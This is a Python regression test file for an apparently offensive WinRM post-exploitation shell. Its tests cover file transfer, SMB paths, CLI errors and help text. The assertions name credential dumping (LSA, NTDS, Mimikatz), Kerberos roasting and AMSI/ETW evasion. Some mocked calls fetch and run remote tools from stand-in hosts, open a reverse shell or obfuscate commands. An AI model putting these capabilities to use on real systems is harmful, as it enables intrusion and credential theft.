"""Regression tests for CLI, interruption, transfer, and shell runtime behavior."""

import hashlib
import base64
import io
import logging
import os
import tempfile
import unittest
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pwnrm.cli as cli
from pwnrm.core.runspace import Runspace
from pwnrm.core.tunnel import PortForwarder
from pwnrm.core.api import argument_parser
from pwnrm.core.credentials import KrbCredential
from pwnrm.shell.ctrlc import CtrlCHandler
from pwnrm.shell.pwnshell import COMMAND_REGISTRY, PwnShell


class TestRuntimeCore(unittest.TestCase):
    def test_remote_file_memory_stream_verifies_hash_without_writing_disk(self):
        shell = object.__new__(PwnShell)
        shell.last_run_errors = []
        payload = b"sensitive-dump"
        trailer = hashlib.sha256(payload).hexdigest().upper().encode()
        shell.run_sync = MagicMock(side_effect=[
            r"C:\Temp\dump.bin",
            "False",
            f"{len(payload)}\n{trailer.decode()}",
        ])
        shell._transfer_chunk_size = MagicMock(return_value=4096)
        shell.write_progress = MagicMock()

        def stream(_script, handler):
            handler({"stdout": base64.b64encode(payload).decode()})
            handler({"stdout": base64.b64encode(trailer).decode()})
            return False

        shell.run_with_interrupt = MagicMock(side_effect=stream)
        result = shell.read_remote_file(r"C:\Temp\dump.bin")
        self.assertEqual(result, bytearray(payload))

    def test_remote_cleanup_is_verified(self):
        shell = object.__new__(PwnShell)
        shell.last_run_errors = []
        shell.run_sync = MagicMock(return_value="False")
        self.assertTrue(shell.delete_remote_path(r"C:\Temp\pwnrm", recursive=True))
        self.assertIn("-Recurse", shell.run_sync.call_args.args[0])

    def test_large_remote_file_prefers_smb_fast_path(self):
        shell = object.__new__(PwnShell)
        shell.last_run_errors = []
        payload = bytearray(b"x" * (256 * 1024))
        digest = hashlib.sha256(payload).hexdigest().upper()
        shell.run_sync = MagicMock(side_effect=[
            r"C:\Temp\dump.bin",
            "False",
            f"{len(payload)}\n{digest}",
        ])
        shell._read_remote_file_smb = MagicMock(return_value=payload)
        result = shell.read_remote_file(r"C:\Temp\dump.bin")
        self.assertIs(result, payload)
        shell._read_remote_file_smb.assert_called_once()

    @patch("impacket.smbconnection.SMBConnection")
    def test_smb_fast_path_strips_file_uri_for_impacket(self, smb_cls):
        payload = b"bulk-data"
        digest = hashlib.sha256(payload).hexdigest().upper().encode()
        creds = KrbCredential(
            "INLANEFREIGHT.LOCAL",
            "Administrator",
            ticket=None,
            tgskey=None,
            ccache="FILE:/tmp/operator.ccache",
        )
        shell = object.__new__(PwnShell)
        shell.runspace = SimpleNamespace(
            _transport=SimpleNamespace(creds=creds, url="http://dc01:5985/wsman"),
            timeout=30,
        )
        shell.target_info = {"host": "dc01"}
        shell.write_progress = MagicMock()
        smb = smb_cls.return_value
        smb.kerberosLogin.side_effect = lambda *_args, **_kwargs: self.assertEqual(
            os.environ["KRB5CCNAME"], "/tmp/operator.ccache"
        )
        smb.getFile.side_effect = lambda _share, _path, callback: callback(payload)

        with patch.dict(os.environ, {"KRB5CCNAME": "operator-original"}):
            result = shell._read_remote_file_smb(
                r"C:\Temp\dump.bin",
                len(payload),
                digest,
                1024,
            )
            self.assertEqual(os.environ["KRB5CCNAME"], "operator-original")

        self.assertEqual(result, bytearray(payload))
        self.assertEqual(smb.kerberosLogin.call_args.kwargs["useCache"], True)
        self.assertEqual(smb.getFile.call_args.args[:2], ("C$", r"Temp\dump.bin"))

    def test_psrp_transfer_rejects_length_mismatch_even_with_matching_trailer(self):
        shell = object.__new__(PwnShell)
        shell.last_run_errors = []
        payload = b"short"
        digest = hashlib.sha256(payload).hexdigest().upper().encode()
        shell.run_sync = MagicMock(side_effect=[
            r"C:\Temp\dump.bin",
            "False",
            f"99\n{digest.decode()}",
        ])
        shell._transfer_chunk_size = MagicMock(return_value=4096)
        shell.write_progress = MagicMock()

        def stream(_script, handler):
            handler({"stdout": base64.b64encode(payload).decode()})
            handler({"stdout": base64.b64encode(digest).decode()})
            return False

        shell.run_with_interrupt = stream
        with self.assertRaisesRegex(OSError, "length mismatch"):
            shell.read_remote_file(r"C:\Temp\dump.bin")

    def test_pypsrp_info_chatter_is_hidden_without_debug(self):
        logger = logging.getLogger("pypsrp")
        previous = logger.level
        try:
            cli._configure_dependency_logging(False)
            self.assertEqual(logger.level, logging.CRITICAL)
            cli._configure_dependency_logging(True)
            self.assertEqual(logger.level, logging.NOTSET)
        finally:
            logger.setLevel(previous)

    def test_interactive_help_registry_is_current_and_truthful(self):
        rendered = "\n".join(
            f"{section}\n{syntax}\n{description}"
            for section, commands in COMMAND_REGISTRY.items()
            for syntax, description in commands.items()
        )
        self.assertIn("!ligolo [start|fetch|list|status|stop|restart|cleanup|profile]", rendered)
        self.assertIn("!jobs [list|status ID|output ID|stop ID|cleanup]", rendered)
        self.assertIn("!ticket [list|inspect|use|renew]", rendered)
        self.assertIn("!capabilities [COMMAND]", rendered)
        self.assertIn("!noconsolation [native|managed] [--capture-output|--detached]", rendered)
        self.assertIn("!creds [vault|dpapi|decrypt B64|history|browser|lsa]", rendered)
        self.assertIn("!kerberos [roast|asrep|rbcd|dmsa|diamond]", rendered)
        self.assertIn("!evasion [edr|amsi|etw]", rendered)
        self.assertIn("!help", rendered)
        self.assertIn("[--remote] [--timeout SEC]", rendered)
        self.assertIn("--lsa-output PATH", rendered)
        self.assertIn(
            "!vss [sam|lsa|ntds] [--mimikatz] [--mimikatz-executor PE] "
            "[--user USER] [--drive C:] [--download]",
            rendered,
        )
        self.assertIn("Diskless Mimikatz or ephemeral VSS", rendered)
        self.assertIn("[--lsa-executor PE] [--lsa-timeout SEC] [--lsa-output PATH] [--download]", rendered)
        for dashed_mode in ("--vault", "--lsa]", "--roast", "--native", "--edr", "--tier0"):
            self.assertNotIn(dashed_mode, rendered)
        self.assertNotIn("In-band SOCKS5 proxy", rendered)
        self.assertNotIn("Full ADCS ESC1-ESC17+", rendered)
        self.assertNotIn("--elevate", rendered)
        self.assertNotIn("MS-RPRN", rendered)

    def test_cli_help_uses_the_same_mode_option_convention(self):
        epilog = argument_parser().epilog
        self.assertIn(
            "!creds [vault|dpapi|decrypt B64|history|browser|lsa] "
            "[--lsa-executor PE] [--lsa-timeout SEC] [--lsa-output PATH] [--download]",
            epilog,
        )
        self.assertIn("!noconsolation [native|managed] [--capture-output|--detached]", epilog)
        self.assertIn(
            "!vss [sam|lsa|ntds] [--mimikatz] [--mimikatz-executor PE] [--user USER]",
            epilog,
        )
        self.assertIn("!playbook [list|run <name>|run --file PATH]", epilog)
        self.assertNotIn("[--roast|--asrep", epilog)
        self.assertNotIn("[--native|--managed]", epilog)

    @patch("builtins.print")
    def test_interactive_help_wraps_long_command_syntax(self, print_mock):
        shell = object.__new__(PwnShell)
        shell.start_time = datetime.now()
        shell.target_info = {"host": "DC01", "user": "Administrator"}
        shell.socks_server = None
        shell.cmd_count = 0
        shell.opsec_profile = SimpleNamespace(mode="balanced")

        shell.help()

        lines = [str(call.args[0]) for call in print_mock.call_args_list if call.args]
        self.assertFalse(any("██████╗" in line for line in lines))
        syntax_index = next(
            index for index, line in enumerate(lines)
            if "!noconsolation [native|managed] [--capture-output|--detached]" in line
        )
        self.assertNotIn("Run managed/native PE from memory", lines[syntax_index])
        self.assertIn("Run managed/native PE from memory", lines[syntax_index + 1])

    @patch("builtins.print")
    def test_interactive_help_identifies_stateless_backend(self, print_mock):
        shell = object.__new__(PwnShell)
        shell.start_time = datetime.now()
        shell.target_info = {"host": "DC01", "user": "Administrator"}
        shell.runspace = SimpleNamespace(backend_name="wmiexec", persistent=False)
        shell.socks_server = None
        shell.cmd_count = 0
        shell.opsec_profile = SimpleNamespace(mode="balanced")
        shell.help()
        output = "\n".join(str(call.args[0]) for call in print_mock.call_args_list if call.args)
        self.assertIn("wmiexec", output)
        self.assertIn("stateless PowerShell", output)
        self.assertIn("require --protocol winrm", output)

    def test_repl_dispatches_explicit_help_command(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.help = MagicMock(return_value={"status": "help"})

        result = shell.repl(inputs=["!help"])

        self.assertEqual(result, {"status": "help"})
        shell.help.assert_called_once_with("")

    @patch("builtins.print")
    def test_interactive_startup_prints_one_banner_and_not_help(self, print_mock):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30, target="host", username="user",
            replay=None, X=None, exec_method="auto",
        )
        transport = MagicMock()
        transport.url = "http://host:5985/wsman"
        transport.creds = SimpleNamespace(domain="LAB", username="user")
        shell = MagicMock()
        shell.start_time = datetime.now()
        shell.cmd_count = 0
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=transport),
            patch("pwnrm.cli.tcp_reachable", return_value=True),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 0)

        shell.help.assert_not_called()
        shell.repl.assert_called_once_with()
        banners = [
            call for call in print_mock.call_args_list
            if call.args and "██████╗" in str(call.args[0])
        ]
        self.assertEqual(len(banners), 1)

    def test_cli_returns_failure_for_transport_setup_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(ts=False, debug=False, timeout="30")
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", side_effect=ValueError("bad auth")),
            patch("builtins.print"),
        ):
            self.assertEqual(cli.main(), 1)

    def test_cli_returns_failure_for_connection_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout="30", target="host", username="user"
        )
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace", side_effect=RuntimeError("offline")),
            patch("builtins.print"),
        ):
            self.assertEqual(cli.main(), 1)

    def test_connect_timeout_has_short_actionable_diagnostic(self):
        transport = SimpleNamespace(url="http://dc01:5985/wsman")
        low_level = TimeoutError("timed out")
        timeout = RuntimeError("connect timeout while opening socket")
        timeout.__cause__ = low_level
        message = cli._connection_failure_message(timeout, transport, 30)
        self.assertIn("dc01:5985", message)
        self.assertIn("Windows Firewall profile", message)
        self.assertIn("--debug", message)
        self.assertNotIn("Traceback", message)

    def test_concise_logging_filter_hides_exception_records(self):
        record = logging.LogRecord(
            "pypsrp.wsman", logging.ERROR, __file__, 1, "failed", (),
            (RuntimeError, RuntimeError("offline"), None),
        )
        self.assertFalse(cli._ConciseLoggingFilter().filter(record))
        record.exc_info = None
        self.assertTrue(cli._ConciseLoggingFilter().filter(record))

    def test_cli_single_command_returns_failure_for_remote_error(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30, target="host", username="user", replay=None, X="bad"
        )
        shell = MagicMock()
        shell.repl.return_value = {"status": "error", "error": "remote failure"}
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell),
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 1)

    def test_cli_replay_preserves_failure_exit_status(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30, target="host", username="user",
            replay="transcript.log", X=None,
        )
        shell = MagicMock()
        shell.repl.side_effect = [{"status": "error", "error": "bad step"}, None]
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=MagicMock()),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell),
            patch("pwnrm.cli.parse_replay_log", return_value=["bad"]),
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 1)

    def test_cli_target_info_never_contains_target_password(self):
        parser = MagicMock()
        parser.parse_args.return_value = SimpleNamespace(
            ts=False, debug=False, timeout=30,
            target="CORP/user:TopSecret@dc01", username="", replay=None, X="whoami",
        )
        transport = MagicMock()
        transport.url = "http://dc01:5985/wsman"
        transport.creds = SimpleNamespace(domain="CORP", username="user")
        shell = MagicMock()
        shell.repl.return_value = {"status": "completed"}
        shell.start_time = __import__("datetime").datetime.now()
        shell.cmd_count = 1
        with (
            patch("pwnrm.cli.argument_parser", return_value=parser),
            patch("pwnrm.cli.create_transport", return_value=transport),
            patch("pwnrm.cli.tcp_reachable", return_value=True),
            patch("pwnrm.cli.Runspace") as runspace_type,
            patch("pwnrm.cli.PwnShell", return_value=shell) as shell_type,
            patch("builtins.print"),
        ):
            runspace_type.return_value.__enter__.return_value = MagicMock()
            self.assertEqual(cli.main(), 0)
        target_info = shell_type.call_args.kwargs["target_info"]
        self.assertEqual(target_info, {"host": "dc01", "user": "CORP\\user"})
        self.assertNotIn("TopSecret", repr(target_info))

    def test_display_host_handles_non_string_transport_url_safely(self):
        transport = MagicMock()
        args = SimpleNamespace(target="CORP/user:TopSecret@dc01")
        self.assertEqual(cli._display_host(transport, args), "dc01")
        self.assertNotIn("TopSecret", cli._display_host(transport, args))

    def test_runspace_interrupt_stops_active_pipeline(self):
        runspace = object.__new__(Runspace)
        runspace._active_ps = MagicMock()
        self.assertTrue(runspace.interrupt())
        runspace._active_ps.stop.assert_called_once_with()
        runspace._active_ps = None
        self.assertFalse(runspace.interrupt())

    def test_runspace_enter_closes_wsman_when_pool_open_fails(self):
        runspace = object.__new__(Runspace)
        runspace._wsman = MagicMock()
        runspace._pool = None
        runspace.shell_id = None
        with patch("pwnrm.core.runspace.RunspacePool") as pool_type:
            pool_type.return_value.open.side_effect = RuntimeError("open failed")
            with self.assertRaisesRegex(RuntimeError, "open failed"):
                runspace.__enter__()
        runspace._wsman.__enter__.assert_called_once_with()
        runspace._wsman.__exit__.assert_called_once()
        self.assertIsNone(runspace._pool)

    def test_runspace_uses_interruptible_async_pipeline(self):
        class Streams:
            error = []
            warning = []
            verbose = []
            information = []
            progress = []

        class FakePowerShell:
            def __init__(self, pool):
                self.id = "pipeline-id"
                self.state = 1
                self.output = []
                self.streams = Streams()
                self.begin_options = None

            def add_script(self, command):
                return self

            def add_cmdlet(self, command):
                return self

            def add_parameter(self, command):
                return self

            def begin_invoke(self, remote_stream_options):
                self.begin_options = remote_stream_options

            def poll_invoke(self, timeout):
                self.output.append("result")
                self.state = 4

        runspace = object.__new__(Runspace)
        runspace._pool = MagicMock()
        runspace._active_ps = None
        runspace.timeout = 30
        runspace.consecutive_timeouts = 0
        runspace.max_consecutive_timeouts = 3
        runspace.command_id = None
        with patch("pwnrm.core.runspace.PowerShell", FakePowerShell):
            events = list(runspace.run_command("whoami"))
        self.assertEqual(events, [{"stdout": "result\n"}])
        self.assertIsNone(runspace._active_ps)

    def test_ctrlc_handler_invokes_interrupt_callback(self):
        installed = {}

        def fake_signal(sig, handler):
            installed[sig] = handler

        callback = MagicMock()
        with (
            patch("pwnrm.shell.ctrlc.getsignal", return_value=object()),
            patch("pwnrm.shell.ctrlc.signal", side_effect=fake_signal),
        ):
            with CtrlCHandler(on_interrupt=callback):
                handler = next(value for value in installed.values() if callable(value))
                handler(None, None)
                handler(None, None)
        callback.assert_called_once_with()

    @staticmethod
    def _bare_shell():
        shell = object.__new__(PwnShell)
        shell.stdout_log = None
        shell.socks_server = None
        shell.write_info = MagicMock()
        shell.write_warning = MagicMock()
        shell.write_error = MagicMock()
        shell.write_progress = MagicMock()
        shell.write_line = MagicMock()
        return shell

    def test_directory_download_normalizes_boolean_output(self):
        shell = self._bare_shell()

        def run_sync(command, *args, **kwargs):
            if command.startswith("Resolve-Path"):
                return "C:\\Temp\\folder\n"
            if command.startswith("Test-Path"):
                return "True\n"
            if "GetTempPath" in command:
                return "C:\\Windows\\Temp\\\n"
            return ""

        shell.run_sync = MagicMock(side_effect=run_sync)
        shell.run_with_interrupt = MagicMock(return_value=False)
        with tempfile.TemporaryDirectory() as td:
            shell.download(f'C:\\Temp\\folder "{Path(td) / "folder.zip"}"')
        commands = [call.args[0] for call in shell.run_with_interrupt.call_args_list]
        self.assertTrue(any("CreateFromDirectory" in command for command in commands))

    def test_empty_file_upload_creates_remote_temp_file(self):
        shell = self._bare_shell()
        expected = hashlib.sha256(b"").hexdigest().upper()

        def run_sync(command, *args, **kwargs):
            if "GetTempPath" in command:
                return "C:\\Windows\\Temp\\\n"
            if "Get-FileHash" in command:
                return expected + "\n"
            return ""

        shell.run_sync = MagicMock(side_effect=run_sync)
        shell.run_with_interrupt = MagicMock(return_value=False)
        with tempfile.TemporaryDirectory() as td:
            empty = Path(td) / "empty.bin"
            empty.write_bytes(b"")
            shell.upload(str(empty))
        commands = [call.args[0] for call in shell.run_sync.call_args_list]
        self.assertTrue(any("WriteAllBytes" in command for command in commands))
        shell.write_error.assert_not_called()

    def test_stateless_upload_uses_authenticated_smb_and_verifies_hash(self):
        shell = self._bare_shell()
        shell.runspace = SimpleNamespace(persistent=False)
        shell.cwd = r"C:\Users\Administrator"
        smb = MagicMock()
        captured = {}

        def put_file(_share, path, reader):
            captured[path] = reader()

        def get_file(_share, path, callback):
            callback(captured[path])

        smb.putFile.side_effect = put_file
        smb.getFile.side_effect = get_file
        shell._open_authenticated_smb = MagicMock(return_value=smb)
        with tempfile.TemporaryDirectory() as td:
            source = Path(td) / "payload.bin"
            source.write_bytes(b"fallback-upload")
            result = shell.upload(f'"{source}" C:\\Windows\\Temp\\payload.bin')
        self.assertEqual(result["status"], "completed")
        smb.rename.assert_called_once()
        smb.logoff.assert_called_once()
        shell.write_error.assert_not_called()

    def test_netrun_restores_console_writers(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        shell.netrun("https://example.invalid/tool.exe")
        commands = [call.args[0] for call in shell.run_with_interrupt.call_args_list]
        script = "\n".join(commands)
        self.assertIn("$oldOut = [Console]::Out", script)
        self.assertIn("$oldErr = [Console]::Error", script)
        self.assertIn("finally {", script)
        self.assertIn("[Console]::SetOut($oldOut)", script)
        self.assertIn("[Console]::SetError($oldErr)", script)
        self.assertNotIn("[Console]::SetOut([IO.StreamWriter]::Null)", script)

    def test_psrun_rejects_extra_args_and_reads_remote_xor_file(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        result = shell.psrun("-xor C:\\Windows\\Temp\\stage.ps1")
        self.assertEqual(result["status"], "completed")
        script = shell.run_with_interrupt.call_args.args[0]
        self.assertIn("[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.ps1')", script)
        self.assertIn("[Array]::Clear($data", script)

        shell.run_with_interrupt.reset_mock()
        result = shell.psrun("https://example.test/a.ps1 ignored")
        self.assertEqual(result["status"], "error")
        shell.run_with_interrupt.assert_not_called()

    def test_revshell_rejects_ipv6_instead_of_truncating_address(self):
        shell = self._bare_shell()
        shell.run_with_interrupt = MagicMock(return_value=False)
        result = shell.revshell("2001:db8::1 4444")
        self.assertEqual(result["status"], "error")
        shell.run_with_interrupt.assert_not_called()

    def test_port_forward_dispatch_can_stop_all(self):
        shell = self._bare_shell()
        shell.port_forwarder = PortForwarder()
        shell.port_forwarder.start_local_forward(0, "127.0.0.1", 11082)
        shell._portfwd_dispatch("stop all")
        self.assertEqual(shell.port_forwarder.list_forwards(), [])

    def test_repl_requires_exact_builtin_command_name(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        shell.module_mgr = MagicMock()
        shell.help = MagicMock()

        shell.repl(inputs=["!adcsfoo"])

        shell.help.assert_called_once_with()
        shell.module_mgr.get_module.assert_not_called()

    def test_repl_propagates_remote_module_error_records(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        module = MagicMock()

        def run_module(active_shell, args):
            active_shell.run_with_interrupt("bad-script", active_shell.write_line)
            return {"status": "completed"}

        module.run.side_effect = run_module
        shell.module_mgr = MagicMock()
        shell.module_mgr.get_module.return_value = module
        shell.runspace = MagicMock()
        shell.runspace.run_command.return_value = iter([{"error": "remote parse failure"}])

        result = shell.repl(inputs=["!adcs"])

        self.assertEqual(result["status"], "error")
        self.assertIn("remote parse failure", result["error"])

    def test_batch_repl_preserves_earlier_failure(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.opsec_profile = SimpleNamespace(jitter_sleep=MagicMock())
        shell.target_info = {}
        shell._no_args_dispatch = PwnShell._no_args_dispatch.__get__(shell)
        shell.sysinfo = MagicMock(side_effect=[{"status": "error"}, {"status": "completed"}])
        shell.module_mgr = MagicMock()

        result = shell.repl(inputs=["!sysinfo", "!sysinfo"])

        self.assertEqual(result["status"], "error")

    def test_dispatchers_reject_unexpected_arguments(self):
        shell = self._bare_shell()
        shell.session_mgr = MagicMock()
        shell.port_forwarder = MagicMock()
        shell.module_mgr = MagicMock()
        shell.loot_mgr = MagicMock()
        shell.opsec_profile = SimpleNamespace(mode="balanced", set_mode=MagicMock())
        shell.sysinfo = MagicMock(return_value={"status": "completed"})
        shell._no_args_dispatch = PwnShell._no_args_dispatch.__get__(shell)

        self.assertEqual(shell._session_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._portfwd_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._module_dispatch("list extra")["status"], "error")
        self.assertEqual(shell._loot_dispatch("extra")["status"], "error")
        self.assertEqual(shell._opsec_dispatch("balanced extra")["status"], "error")
        self.assertEqual(shell._no_args_dispatch("extra", shell.sysinfo, "!sysinfo")["status"], "error")
        shell.sysinfo.assert_not_called()

    def test_repl_applies_active_profile_to_raw_commands(self):
        shell = self._bare_shell()
        shell.update_cwd = MagicMock()
        shell.cmd_count = 0
        shell.last_run_errors = []
        shell.target_info = {}
        shell.opsec_profile = SimpleNamespace(
            jitter_sleep=MagicMock(),
            obfuscate_cmd=MagicMock(return_value="G`et-Pr`ocess"),
        )
        shell.run_with_interrupt = MagicMock(return_value=False)
        shell.module_mgr = MagicMock()

        result = shell.repl(inputs=["Get-Process"])

        self.assertEqual(result["status"], "completed")
        shell.opsec_profile.obfuscate_cmd.assert_called_once_with("Get-Process")
        shell.run_with_interrupt.assert_called_once_with("G`et-Pr`ocess", shell.write_line)

    def test_transcript_records_sanitized_errors_and_warnings(self):
        shell = self._bare_shell()
        shell.need_clear = False
        shell.stdout_log = io.BytesIO()
        with patch("builtins.print"):
            PwnShell.write_line(shell, {"error": "bad\x1b[2J error"})
            PwnShell.write_line(shell, {"warn": "careful"})
        transcript = shell.stdout_log.getvalue().decode()
        self.assertIn("[ERROR] bad error", transcript)
        self.assertIn("[WARN] careful", transcript)
        self.assertNotIn("\x1b", transcript)


if __name__ == "__main__":
    unittest.main()
